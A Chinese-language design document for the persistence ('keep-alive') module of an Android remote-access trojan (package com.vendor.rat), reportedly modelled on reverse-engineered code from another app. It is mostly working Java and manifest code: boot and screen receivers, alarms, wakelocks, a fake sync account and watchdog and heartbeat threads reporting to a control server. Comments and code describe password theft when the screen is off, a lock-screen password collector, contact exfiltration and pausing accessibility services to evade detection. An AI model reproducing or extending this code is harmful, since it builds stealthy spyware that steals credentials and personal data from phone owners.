# 模块 07：保活机制模块设计文档

> **模块名称**: Keep-Alive Mechanism Module
> **优先级**: P1（高）
> **依赖**: 模块 08（启动流程模块）
> **版本**: 1.0
> **日期**: 2026-03-17

---

## 一、模块概述

### 1.1 功能描述

保活机制模块实现多层次的进程保活策略，确保应用在各种系统环境下持续运行，包括前台服务、广播监听、定时任务、WakeLock、账号同步等机制。

### 1.2 核心能力

- ✅ 前台服务保活（Foreground Service + START_STICKY）
- ✅ 系统广播监听（开机、息屏、电池、网络变化）
- ✅ 定时唤醒（AlarmManager + JobScheduler）
- ✅ WakeLock 保持（PARTIAL_WAKE_LOCK）
- ✅ 账号同步保活（AccountAuthenticator）
- ✅ 进程监控（CheckThread 心跳检测）
- ✅ 息屏策略（屏幕关闭时激活后台任务）

---

## 二、架构设计

```
┌─────────────────────────────────────────────────────────┐
│                  Layer 1: 系统事件监听                    │
│  BootReceiver | ScreenBroadcastReceiver | PowerReceiver  │
│  BatteryReceiver | NetworkReceiver | SmsReceiver         │
└─────────────────────────────────────────────────────────┘
                          ↓ 触发
┌─────────────────────────────────────────────────────────┐
│                  Layer 2: 前台服务                        │
│  MediaLiveService | WIFIBackgroundService                │
│  CustomNotificationService                               │
└─────────────────────────────────────────────────────────┘
                          ↓ 保持
┌─────────────────────────────────────────────────────────┐
│                  Layer 3: 唤醒机制                        │
│  AlarmManager | JobScheduler | WakeLock                  │
└─────────────────────────────────────────────────────────┘
                          ↓ 增强
┌─────────────────────────────────────────────────────────┐
│                  Layer 4: 辅助保活                        │
│  AccountAuthenticator | CheckThread | HeartThread        │
└─────────────────────────────────────────────────────────┘
```

### 2.1 包结构

```
com.vendor.rat.keepalive
├── KeepAliveManager.java           # 保活管理器
├── receiver/
│   ├── BootReceiver.java           # 开机广播
│   ├── ScreenBroadcastReceiver.java # 息屏/亮屏广播
│   ├── AlarmReceiver.java          # 定时器广播
│   ├── BatteryLevelReceiver.java   # 电池状态广播
│   └── NetworkChangeReceiver.java  # 网络变化广播
├── service/
│   ├── WIFIBackgroundService.java  # WiFi 后台服务
│   └── AccountAuthenticatorService.java # 账号同步服务
├── thread/
│   ├── CheckThread.java            # 进程监控线程
│   └── HeartThread.java            # 心跳线程
└── strategy/
    └── ScreenOffStrategy.java      # 息屏策略
```

---

## 三、系统广播监听

### 3.1 BootReceiver

**基于**: `com/guard/wallet/receiver/BootReceiver.java`

```java
package com.vendor.rat.keepalive.receiver;

/**
 * 开机自启动接收器
 * 监听 BOOT_COMPLETED 广播，启动核心服务
 */
public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();

        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                || Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action)
                || "android.intent.action.QUICKBOOT_POWERON".equals(action)) {

            Log.d("BootReceiver", "Device booted, starting services");

            // 启动核心服务
            KeepAliveManager.getInstance().startAllServices(context);
        }
    }
}
```

**AndroidManifest.xml 注册**:

```xml
<receiver
    android:name=".keepalive.receiver.BootReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter android:priority="1000">
        <action android:name="android.intent.action.BOOT_COMPLETED" />
        <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
        <action android:name="android.intent.action.QUICKBOOT_POWERON" />
    </intent-filter>
</receiver>
```

### 3.2 ScreenBroadcastReceiver

**基于**: `com/guard/wallet/receiver/ScreenBroadcastReceiver.java`

```java
package com.vendor.rat.keepalive.receiver;

/**
 * 息屏/亮屏接收器
 * - 息屏时激活后台任务（数据收集、密码窃取等）
 * - 亮屏时暂停高风险操作
 */
public class ScreenBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();

        if (Intent.ACTION_SCREEN_OFF.equals(action)) {
            Log.d("ScreenReceiver", "Screen OFF");
            onScreenOff(context);
        }
        else if (Intent.ACTION_SCREEN_ON.equals(action)) {
            Log.d("ScreenReceiver", "Screen ON");
            onScreenOn(context);
        }
    }

    private void onScreenOff(Context context) {
        // 1. 上报息屏状态
        NetworkManager.getInstance().getWebSocketClient()
            .sendStatus("screen_off");

        // 2. 暂停无障碍服务代理（减少检测风险）
        if (MyAccessibilityService.getInstance() != null) {
            MyAccessibilityService.getInstance().pauseProxy();
        }

        // 3. 执行息屏策略
        ScreenOffStrategy.execute(context);

        // 4. 启动锁屏密码采集
        LockCipherCollector collector = new LockCipherCollector();
        collector.startCapture(context);

        // 5. 调度延迟任务（配置中 perScreenOffDuration = 2 分钟）
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            // 延迟执行后台数据同步
            DataCollectionManager.getInstance().syncContacts();
        }, 2 * 60 * 1000);
    }

    private void onScreenOn(Context context) {
        // 上报亮屏状态
        NetworkManager.getInstance().getWebSocketClient()
            .sendStatus("screen_on");

        // 恢复无障碍服务
        if (MyAccessibilityService.getInstance() != null) {
            MyAccessibilityService.getInstance().resumeProxy();
        }
    }

    /**
     * 动态注册（SCREEN_OFF/ON 必须动态注册）
     */
    public static void register(Context context) {
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_USER_PRESENT); // 解锁

        context.registerReceiver(new ScreenBroadcastReceiver(), filter);
    }
}
```

### 3.3 BatteryLevelReceiver

```java
package com.vendor.rat.keepalive.receiver;

public class BatteryLevelReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();

        if (Intent.ACTION_BATTERY_CHANGED.equals(action)) {
            int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);

            float batteryPct = level * 100f / scale;
            boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING
                || status == BatteryManager.BATTERY_STATUS_FULL);

            // 低电量时减少数据同步频率
            if (batteryPct < 15 && !isCharging) {
                KeepAliveManager.getInstance().enterLowPowerMode();
            } else {
                KeepAliveManager.getInstance().exitLowPowerMode();
            }
        }

        // 充电连接/断开也可以作为唤醒触发
        if (Intent.ACTION_POWER_CONNECTED.equals(action)
                || Intent.ACTION_POWER_DISCONNECTED.equals(action)) {
            KeepAliveManager.getInstance().ensureServicesRunning(context);
        }
    }
}
```

---

## 四、定时唤醒机制

### 4.1 AlarmReceiver

**基于**: `com/guard/wallet/receiver/AlarmReceiver.java`

```java
package com.vendor.rat.keepalive.receiver;

public class AlarmReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String packageName = context.getPackageName();

        // 心跳检查闹钟
        if ((packageName + ".alarm.action").equals(intent.getAction())) {
            Log.d("AlarmReceiver", "Heartbeat alarm triggered");

            // 触发心跳
            HeartThread heartThread = KeepAliveManager.getInstance()
                .getHeartThread();
            if (heartThread != null) {
                heartThread.triggerHeartbeat();
            }

            // 确保服务存活
            KeepAliveManager.getInstance().ensureServicesRunning(context);
        }

        // 暂停无障碍服务（躲避检测）
        if ((packageName + ".pause.accessibility").equals(intent.getAction())) {
            MyAccessibilityService.setPaused(true);
        }

        // 恢复无障碍服务
        if ((packageName + ".resume.accessibility").equals(intent.getAction())) {
            MyAccessibilityService.setPaused(false);
        }
    }
}
```

### 4.2 AlarmManager 配置

```java
public class AlarmScheduler {

    /**
     * 设置重复唤醒闹钟
     */
    public static void scheduleRepeatingAlarm(Context context) {
        AlarmManager alarmManager = (AlarmManager)
            context.getSystemService(Context.ALARM_SERVICE);

        Intent intent = new Intent(
            context.getPackageName() + ".alarm.action"
        );
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            context, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        long interval = 5 * 60 * 1000L; // 5 分钟间隔

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Android 6.0+ Doze 模式下使用精确闹钟
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + interval,
                pendingIntent
            );
        } else {
            alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + interval,
                interval,
                pendingIntent
            );
        }
    }

    /**
     * 设置精确唤醒（Android 6.0+ 需要每次重新设置）
     */
    public static void scheduleNextAlarm(Context context) {
        // setExactAndAllowWhileIdle 是一次性的，
        // 需要在 AlarmReceiver.onReceive 中重新设置
        scheduleRepeatingAlarm(context);
    }
}
```

### 4.3 JobScheduler 后台任务

```java
public class KeepAliveJobService extends JobService {

    private static final int JOB_ID = 1001;

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d("KeepAliveJob", "Job started");

        // 确保核心服务存活
        KeepAliveManager.getInstance()
            .ensureServicesRunning(getApplicationContext());

        // 重新调度下一次 Job
        scheduleJob(getApplicationContext());

        return false; // 无异步工作
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true; // 被中断时重试
    }

    public static void scheduleJob(Context context) {
        JobScheduler scheduler = (JobScheduler)
            context.getSystemService(Context.JOB_SCHEDULER_SERVICE);

        ComponentName componentName = new ComponentName(
            context, KeepAliveJobService.class
        );

        JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, componentName)
            .setPersisted(true)            // 重启后保留
            .setRequiredNetworkType(
                JobInfo.NETWORK_TYPE_ANY   // 有网络时执行
            )
            .setPeriodic(15 * 60 * 1000L); // 最小 15 分钟间隔

        scheduler.schedule(builder.build());
    }
}
```

---

## 五、WakeLock 管理

### 5.1 WakeLock 持有

```java
public class WakeLockManager {

    private static PowerManager.WakeLock wakeLock;

    /**
     * 获取 WakeLock（保持 CPU 运行）
     */
    public static void acquire(Context context) {
        if (wakeLock == null) {
            PowerManager pm = (PowerManager)
                context.getSystemService(Context.POWER_SERVICE);
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "vendor:keepalive"
            );
        }

        if (!wakeLock.isHeld()) {
            wakeLock.acquire(10 * 60 * 1000L); // 最多持有 10 分钟
        }
    }

    /**
     * 释放 WakeLock
     */
    public static void release() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    /**
     * 短暂持有（执行完任务后释放）
     */
    public static void acquireTemporary(Context context, long timeoutMs) {
        PowerManager pm = (PowerManager)
            context.getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock tempLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "vendor:temp"
        );
        tempLock.acquire(timeoutMs);
    }
}
```

---

## 六、进程监控线程

### 6.1 CheckThread

**基于**: `com/guard/wallet/thread/CheckThread.java`

```java
package com.vendor.rat.keepalive.thread;

/**
 * 进程存活检查线程
 * 定期检查核心服务和线程是否存活，自动重启
 */
public class CheckThread extends Thread {

    private volatile boolean running = true;
    private static final long CHECK_INTERVAL = 30 * 1000L; // 30 秒

    @Override
    public void run() {
        while (running) {
            try {
                checkServices();
                checkThreads();
                checkWebSocket();

                Thread.sleep(CHECK_INTERVAL);

            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                Log.e("CheckThread", "Check error", e);
            }
        }
    }

    /**
     * 检查核心服务是否存活
     */
    private void checkServices() {
        Context context = MainApplication.getInstance();

        // 检查 MediaLiveService
        if (!isServiceRunning(context, MediaLiveService.class)) {
            Log.w("CheckThread", "MediaLiveService died, restarting");
            Intent intent = new Intent(context, MediaLiveService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        }

        // 检查 WIFIBackgroundService
        if (!isServiceRunning(context, WIFIBackgroundService.class)) {
            Log.w("CheckThread", "WIFIBackgroundService died, restarting");
            context.startService(
                new Intent(context, WIFIBackgroundService.class)
            );
        }
    }

    /**
     * 检查核心线程
     */
    private void checkThreads() {
        HeartThread heartThread = KeepAliveManager.getInstance()
            .getHeartThread();
        if (heartThread == null || !heartThread.isAlive()) {
            Log.w("CheckThread", "HeartThread died, restarting");
            KeepAliveManager.getInstance().restartHeartThread();
        }
    }

    /**
     * 检查 WebSocket 连接
     */
    private void checkWebSocket() {
        WebSocketClient wsClient = NetworkManager.getInstance()
            .getWebSocketClient();
        if (wsClient != null && !wsClient.isConnected()) {
            Log.w("CheckThread", "WebSocket disconnected, reconnecting");
            wsClient.reconnect();
        }
    }

    private boolean isServiceRunning(Context context,
            Class<? extends Service> serviceClass) {
        ActivityManager am = (ActivityManager)
            context.getSystemService(Context.ACTIVITY_SERVICE);

        for (ActivityManager.RunningServiceInfo info :
                am.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(
                    info.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    public void stopChecking() {
        running = false;
        interrupt();
    }
}
```

### 6.2 HeartThread

**基于**: `com/guard/wallet/thread/HeartThread.java`

```java
package com.vendor.rat.keepalive.thread;

/**
 * 心跳线程
 * 定期向服务器发送心跳，维持 WebSocket 连接
 */
public class HeartThread extends Thread {

    private volatile boolean running = true;
    private final AtomicBoolean heartbeatTriggered = new AtomicBoolean(false);
    private static final long HEARTBEAT_INTERVAL = 10 * 1000L; // 10 秒

    @Override
    public void run() {
        while (running) {
            try {
                sendHeartbeat();
                Thread.sleep(HEARTBEAT_INTERVAL);

            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    private void sendHeartbeat() {
        WebSocketClient wsClient = NetworkManager.getInstance()
            .getWebSocketClient();

        if (wsClient != null && wsClient.isConnected()) {
            JsonObject heartbeat = new JsonObject();
            heartbeat.addProperty("type", 1); // HEARTBEAT
            heartbeat.addProperty("timestamp",
                System.currentTimeMillis());

            wsClient.send(heartbeat.toString());
        }
    }

    /**
     * 外部触发心跳（AlarmReceiver 调用）
     */
    public void triggerHeartbeat() {
        heartbeatTriggered.set(true);
        interrupt(); // 唤醒 sleep
    }

    public void stopHeartbeat() {
        running = false;
        interrupt();
    }
}
```

---

## 七、账号同步保活

### 7.1 AccountAuthenticatorService

```java
package com.vendor.rat.keepalive.service;

/**
 * 账号同步保活
 * 利用 Android 的 AccountManager + SyncAdapter 机制
 * 系统会定期唤起同步服务，从而保持进程存活
 */
public class AccountAuthenticatorService extends Service {

    private AccountAuthenticator authenticator;

    @Override
    public void onCreate() {
        super.onCreate();
        authenticator = new AccountAuthenticator(this);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return authenticator.getIBinder();
    }

    /**
     * 设置账号同步
     */
    public static void setupSync(Context context) {
        AccountManager am = AccountManager.get(context);
        String accountType = context.getPackageName() + ".account";
        String authority = context.getPackageName() + ".provider";

        Account account = new Account("SyncAccount", accountType);

        // 添加账号
        if (am.addAccountExplicitly(account, null, null)) {
            // 启用自动同步
            ContentResolver.setIsSyncable(account, authority, 1);
            ContentResolver.setSyncAutomatically(account, authority, true);

            // 设置同步周期（最小 1 小时）
            ContentResolver.addPeriodicSync(
                account, authority, Bundle.EMPTY,
                60 * 60 // 1 小时
            );
        }
    }

    private static class AccountAuthenticator extends AbstractAccountAuthenticator {
        public AccountAuthenticator(Context context) {
            super(context);
        }

        @Override
        public Bundle addAccount(AccountAuthenticatorResponse response,
                String accountType, String authTokenType,
                String[] requiredFeatures, Bundle options) {
            return null;
        }

        // 其他方法返回 null（最小实现）
        @Override
        public Bundle getAuthToken(AccountAuthenticatorResponse response,
                Account account, String authTokenType, Bundle options) {
            return null;
        }
        @Override
        public String getAuthTokenLabel(String authTokenType) { return null; }
        @Override
        public Bundle editProperties(AccountAuthenticatorResponse response,
                String accountType) { return null; }
        @Override
        public Bundle confirmCredentials(AccountAuthenticatorResponse response,
                Account account, Bundle options) { return null; }
        @Override
        public Bundle updateCredentials(AccountAuthenticatorResponse response,
                Account account, String authTokenType, Bundle options) {
            return null;
        }
        @Override
        public Bundle hasFeatures(AccountAuthenticatorResponse response,
                Account account, String[] features) { return null; }
    }
}
```

---

## 八、保活管理器

### 8.1 KeepAliveManager

```java
package com.vendor.rat.keepalive;

public class KeepAliveManager {

    private static volatile KeepAliveManager instance;
    private CheckThread checkThread;
    private HeartThread heartThread;
    private volatile boolean lowPowerMode = false;

    public static KeepAliveManager getInstance() {
        if (instance == null) {
            synchronized (KeepAliveManager.class) {
                if (instance == null) {
                    instance = new KeepAliveManager();
                }
            }
        }
        return instance;
    }

    /**
     * 初始化所有保活机制
     */
    public void init(Context context) {
        // 1. 注册广播接收器
        registerReceivers(context);

        // 2. 设置定时闹钟
        AlarmScheduler.scheduleRepeatingAlarm(context);

        // 3. 调度 JobScheduler
        KeepAliveJobService.scheduleJob(context);

        // 4. 启动监控线程
        startCheckThread();

        // 5. 启动心跳线程
        startHeartThread();

        // 6. 设置账号同步
        AccountAuthenticatorService.setupSync(context);

        // 7. 获取 WakeLock
        WakeLockManager.acquire(context);
    }

    private void registerReceivers(Context context) {
        // 息屏/亮屏（必须动态注册）
        ScreenBroadcastReceiver.register(context);

        // 电池状态
        IntentFilter batteryFilter = new IntentFilter();
        batteryFilter.addAction(Intent.ACTION_BATTERY_CHANGED);
        batteryFilter.addAction(Intent.ACTION_POWER_CONNECTED);
        batteryFilter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        context.registerReceiver(new BatteryLevelReceiver(), batteryFilter);

        // 网络变化
        IntentFilter networkFilter = new IntentFilter(
            ConnectivityManager.CONNECTIVITY_ACTION
        );
        context.registerReceiver(new NetworkChangeReceiver(), networkFilter);
    }

    /**
     * 启动所有核心服务
     */
    public void startAllServices(Context context) {
        // MediaLiveService
        Intent mediaIntent = new Intent(context, MediaLiveService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(mediaIntent);
        } else {
            context.startService(mediaIntent);
        }

        // WIFIBackgroundService
        context.startService(
            new Intent(context, WIFIBackgroundService.class)
        );

        // 确保定时器存活
        AlarmScheduler.scheduleRepeatingAlarm(context);
    }

    /**
     * 确保服务存活（各种触发器调用）
     */
    public void ensureServicesRunning(Context context) {
        if (!lowPowerMode) {
            startAllServices(context);
        }
    }

    private void startCheckThread() {
        if (checkThread == null || !checkThread.isAlive()) {
            checkThread = new CheckThread();
            checkThread.setDaemon(true);
            checkThread.start();
        }
    }

    private void startHeartThread() {
        if (heartThread == null || !heartThread.isAlive()) {
            heartThread = new HeartThread();
            heartThread.setDaemon(true);
            heartThread.start();
        }
    }

    public void restartHeartThread() {
        if (heartThread != null) {
            heartThread.stopHeartbeat();
        }
        startHeartThread();
    }

    public HeartThread getHeartThread() {
        return heartThread;
    }

    public void enterLowPowerMode() {
        lowPowerMode = true;
    }

    public void exitLowPowerMode() {
        lowPowerMode = false;
    }

    public void shutdown() {
        if (checkThread != null) checkThread.stopChecking();
        if (heartThread != null) heartThread.stopHeartbeat();
        WakeLockManager.release();
    }
}
```

---

## 九、息屏策略

### 9.1 ScreenOffStrategy

```java
package com.vendor.rat.keepalive.strategy;

/**
 * 息屏策略
 * 屏幕关闭时触发一系列后台操作
 */
public class ScreenOffStrategy {

    // 配置项（来自 assets/config.json）
    private static int perScreenOffDuration = 2;  // 分钟
    private static int perIdleDuration = 5;        // 分钟

    public static void execute(Context context) {
        // 1. 获取 WakeLock，防止 CPU 休眠
        WakeLockManager.acquireTemporary(context,
            perScreenOffDuration * 60 * 1000L);

        // 2. 触发一次数据同步
        DataCollectionManager.getInstance().syncContacts();

        // 3. 上传待发送队列中的数据
        UploadQueue.getInstance().flush();

        // 4. 重新设置闹钟（确保 Doze 模式下仍可唤醒）
        AlarmScheduler.scheduleNextAlarm(context);

        // 5. 检查 WebSocket 连接
        WebSocketClient wsClient = NetworkManager.getInstance()
            .getWebSocketClient();
        if (wsClient != null && !wsClient.isConnected()) {
            wsClient.reconnect();
        }
    }
}
```

---

## 十、所需权限

```xml
<!-- 开机自启 -->
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

<!-- WakeLock -->
<uses-permission android:name="android.permission.WAKE_LOCK" />

<!-- 前台服务 -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />

<!-- 精确闹钟 (Android 12+) -->
<uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />

<!-- 忽略电池优化 -->
<uses-permission
    android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

<!-- 账号管理 -->
<uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
<uses-permission android:name="android.permission.GET_ACCOUNTS" />

<!-- 网络状态 -->
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
```

---

## 十一、保活效果评估

| 机制 | Android 5-7 | Android 8-9 | Android 10-12 | Android 13+ |
|------|-------------|-------------|---------------|-------------|
| 前台服务 | ✅ 极佳 | ✅ 良好 | ⚠️ 一般 | ⚠️ 受限 |
| BOOT_COMPLETED | ✅ 极佳 | ✅ 良好 | ✅ 良好 | ⚠️ 需声明 |
| AlarmManager | ✅ 极佳 | ⚠️ Doze | ⚠️ Doze | ⚠️ 受限 |
| JobScheduler | N/A | ✅ 良好 | ✅ 良好 | ✅ 良好 |
| WakeLock | ✅ 极佳 | ⚠️ 受限 | ⚠️ 受限 | ⚠️ 受限 |
| 账号同步 | ✅ 极佳 | ✅ 良好 | ⚠️ 一般 | ⚠️ 一般 |
| 无障碍服务 | ✅ 极佳 | ✅ 极佳 | ✅ 极佳 | ✅ 极佳 |

**结论**: 无障碍服务是最可靠的保活手段，在所有 Android 版本上均有效。其他机制作为补充层，提供冗余保护。

---

## 十二、工作量估算

| 功能 | 工作量 | 优先级 |
|------|--------|--------|
| BootReceiver | 0.5 天 | P0 |
| ScreenBroadcastReceiver | 1 天 | P0 |
| AlarmManager + AlarmReceiver | 1 天 | P0 |
| JobScheduler | 0.5 天 | P1 |
| WakeLock 管理 | 0.5 天 | P1 |
| CheckThread 进程监控 | 1 天 | P0 |
| HeartThread 心跳 | 0.5 天 | P0 |
| 账号同步保活 | 1 天 | P2 |
| KeepAliveManager | 1 天 | P0 |
| 息屏策略 | 0.5 天 | P1 |
| 电池/网络广播 | 0.5 天 | P2 |
| **总计** | **8 天** | - |

---

**文档版本**: 1.0
**最后更新**: 2026-03-17
**基于逆向分析**: `com/guard/wallet/receiver/`, `com/guard/wallet/thread/`, `com/guard/wallet/service/`
